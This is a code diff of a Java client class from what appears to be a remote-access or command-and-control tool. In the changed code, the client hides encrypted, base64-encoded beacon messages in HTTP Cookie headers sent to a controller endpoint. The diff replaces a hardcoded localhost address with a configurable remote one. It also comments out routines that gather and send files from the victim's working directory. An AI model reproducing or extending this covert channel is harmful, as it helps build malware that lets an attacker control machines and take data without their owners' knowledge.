@@ -1,16 +1,12 @@
 package com.revsni.client;
 
 import java.io.BufferedReader;
-import java.io.DataInputStream;
 import java.io.EOFException;
-import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 
-import java.util.List;
 
 import java.net.Socket;
 import java.net.URL;
@@ -18,25 +14,26 @@ import java.net.URL;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
 import java.util.Base64;
-import java.util.Collection;
 import java.util.UUID;
 
 import javax.crypto.*;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-import com.revsni.utils.FileData;
-import com.revsni.utils.KeyboardFilesFilter;
+//import java.util.List;
+//import java.util.Arrays;
+//import java.util.Collection;
+//import java.io.File;
+//import java.io.FileInputStream;
+//import com.revsni.utils.FileData;
+//import com.revsni.utils.KeyboardFilesFilter;
 
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
-import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.impl.client.HttpClients;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -106,7 +103,8 @@ public class Client {
         }
         if(type.equals("HTTP")) {
             httpClient = HttpClients.createDefault();
-            HttpGet httpGet = new HttpGet("http://127.0.0.1:8081/lit");
+            String uri = new String("http://" + address[0] + ":" + address[1] +"/lit");
+            HttpGet httpGet = new HttpGet(uri);
             try {
                 httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("est".getBytes())));
             } catch (IllegalBlockSizeException | BadPaddingException e2) {
@@ -208,7 +206,8 @@ public class Client {
             }
             if(type.equals("HTTP")) {
                 httpClient = HttpClients.createDefault();
-                HttpGet httpGet = new HttpGet("http://127.0.0.1:8081/lit");
+                System.out.println("http://" + address[0] + ":" + address[1] +"/lit");
+                HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
                 httpGet.setHeader("Cookie", encoded);
                 try {
                     httpClient.execute(httpGet);
@@ -251,6 +250,7 @@ public class Client {
 
                 if(message.equals("httpSw")) {
                     type = "HTTP";
+                    updateStuff();
                     init();
                 } else if (message.equals("exit")) {
                     sendMessage(uniqueID + ": said goobye, sadly.");
@@ -303,7 +303,7 @@ public class Client {
 
     public void getInstr() {
         httpClient = HttpClients.createDefault();
-        HttpGet httpGet = new HttpGet("http://127.0.0.1:8081/lit");
+        HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
         try {
             httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("give".getBytes())));
         } catch (IllegalBlockSizeException | BadPaddingException e1) {
@@ -319,7 +319,9 @@ public class Client {
         }
     }
 
+    //Filetransfer methodos
 
+    /*
     private Collection<File> prepareFilesToSend() {
         String directoryPath = System.getProperty("user.dir");
         File directory = new File(directoryPath);
@@ -330,7 +332,6 @@ public class Client {
         return filesFound;
     }
     
-
     private FileData createFileData(File file, String directory) {
         FileInputStream fileInputStream = null;
         DataInputStream dataInputStream = null;
@@ -401,6 +402,7 @@ public class Client {
             sendFile(file, directory);
         }
     }
+    */
 
     public void run() {
         try {
